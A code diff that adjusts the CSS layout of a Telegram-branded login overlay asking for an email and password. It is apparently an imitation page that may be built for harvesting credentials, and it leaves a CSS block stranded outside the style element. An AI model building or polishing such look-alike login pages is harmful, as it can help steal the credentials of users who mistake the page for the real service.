@@ -81,6 +81,7 @@
         #tg-start-btn { background: var(--accent); color: white; border: none; padding: 12px; border-radius: 10px; font-size: 16px; font-weight: 600; width: 100%; margin-top: 24px; cursor: pointer; transition: background 0.2s, transform 0.1s; }
         #tg-start-btn:hover { background: var(--accent-light); } #tg-start-btn:active { transform: scale(0.97); }
         @media (max-width: 700px) { #tg-login-overlay { flex-direction: column; overflow-y: auto; } #tg-intro-panel { padding: 20px; min-height: 300px; flex: 0 0 auto; } #tg-login-form { padding: 20px; flex: 1; } .tg-slide h2 { font-size: 22px !important; } }
+    #tg-login-form { padding: 40px 40px 80px !important; }
     </style>
 </head>
 <body>
@@ -95,18 +96,7 @@
       <div class="tg-slide"><div style="font-size:48px;margin-bottom:20px;">☁️</div><h2 style="font-size:28px;margin-bottom:10px;">Cloud-Based</h2><p style="font-size:16px;opacity:0.9;">Telegram lets you access your messages from multiple devices.</p></div>
     </div>
     <div style="display:flex;gap:8px;margin-top:10px;"><span class="tg-dot active"></span><span class="tg-dot"></span><span class="tg-dot"></span><span class="tg-dot"></span><span class="tg-dot"></span></div>
-  </div>
-    #tg-login-form {
-    flex:1;
-    background:var(--card);
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
-    align-items:center;
-    padding: 40px 40px 60px;   /* 底部多留 60px 空间 */
-    min-width:320px;
-    overflow-y: auto;
-}
+  </div>#tg-login-form {flex:1; background:var(--card);display:flex; flex-direction:column; justify-content:center;   align-items:center; padding: 40px 40px 60px;   /* 底部多留 60px 空间 */ min-width:320px;   overflow-y: auto;}
         <div style="max-width:360px;width:100%;">
       <h2 style="font-size:24px;margin-bottom:24px;color:var(--text);">Your Email</h2>
       <p style="font-size:14px;color:var(--sub);margin-bottom:20px;">Please enter your email and password to start messaging.</p>
